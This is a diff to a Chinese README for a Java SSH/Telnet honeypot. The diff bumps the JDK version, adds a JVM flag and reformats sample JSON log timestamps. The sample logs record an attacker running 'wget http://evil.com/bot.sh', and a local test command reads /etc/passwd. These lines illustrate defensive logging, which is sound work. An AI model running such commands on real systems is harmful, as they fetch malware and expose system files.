@@ -1,4 +1,4 @@
-# SSH/Telnet 蜜罐 (Java 21)
+# SSH/Telnet 蜜罐 (Java 25)
 
 一款中交互蜜罐，用于捕获针对服务器的 SSH/Telnet 暴力破解与入侵行为。
 基于 **Apache MINA SSHD** 实现 SSH 协议，原生 Socket 实现 Telnet 协议，
@@ -25,7 +25,7 @@
 ## 构建
 
 ```bash
-# 需要 JDK 21+
+# 需要 JDK 25+
 mvn package
 # 产物：target/ssh-honeypot.jar（含全部依赖的可执行 jar）
 ```
@@ -35,6 +35,12 @@ mvn package
 ```bash
 java -jar target/ssh-honeypot.jar                        # 使用默认 config.yaml
 java -jar target/ssh-honeypot.jar -c /etc/honeypot.yaml  # 指定配置文件
+```
+
+生产环境建议叠加 JDK 25 运行时优化参数（紧凑对象头，减少海量会话对象内存占用）：
+
+```bash
+java -XX:+UseCompactObjectHeaders -jar target/ssh-honeypot.jar
 ```
 
 ### 配置文件（config.yaml）
@@ -76,9 +82,9 @@ ssh -p 2222 root@127.0.0.1 "uname -a; cat /etc/passwd"
 每行一个 JSON 事件：
 
 ```json
-{"ts":"2026-08-11T15:40:01.123","event":"auth_attempt","session":"s1-...","protocol":"ssh","src_ip":"1.2.3.4","username":"root","password":"123456","success":"true"}
-{"ts":"2026-08-11T15:40:05.456","event":"command","session":"s1-...","src_ip":"1.2.3.4","username":"root","command":"wget http://evil.com/bot.sh"}
-{"ts":"2026-08-11T15:40:05.789","event":"download","session":"s1-...","src_ip":"1.2.3.4","username":"root","url":"http://evil.com/bot.sh"}
+{"ts":"2026-08-11 15:40:01.123","event":"auth_attempt","session":"s1-...","protocol":"ssh","src_ip":"1.2.3.4","username":"root","password":"123456","success":"true"}
+{"ts":"2026-08-11 15:40:05.456","event":"command","session":"s1-...","src_ip":"1.2.3.4","username":"root","command":"wget http://evil.com/bot.sh"}
+{"ts":"2026-08-11 15:40:05.789","event":"download","session":"s1-...","src_ip":"1.2.3.4","username":"root","url":"http://evil.com/bot.sh"}
 ```
 
 事件类型：`session_open` / `auth_attempt` / `command` / `download` / `session_close`
